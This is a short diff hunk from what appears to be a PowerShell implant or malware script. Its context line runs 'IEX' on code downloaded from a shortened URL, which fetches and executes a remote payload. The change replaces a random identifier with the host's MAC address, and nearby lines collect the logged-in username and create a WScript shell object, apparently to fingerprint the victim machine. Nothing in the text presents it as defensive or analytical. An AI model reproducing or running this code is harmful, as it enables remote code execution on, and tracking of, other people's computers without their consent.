@@ -25,7 +25,7 @@ powershell IEX (New-Object System.Net.WebClient).DownloadString('http://tinyurl.
 Install -sting test
 
 $ps = "";
-$id = Get-Random
+$id=(Get-WmiObject win32_networkadapterconfiguration | select macaddress)[1]
 $username=( ( Get-WMIObject -class Win32_ComputerSystem | Select-Object -ExpandProperty username ) -split '\\' )[1]
 $wshell = New-Object -ComObject wscript.shell;
 
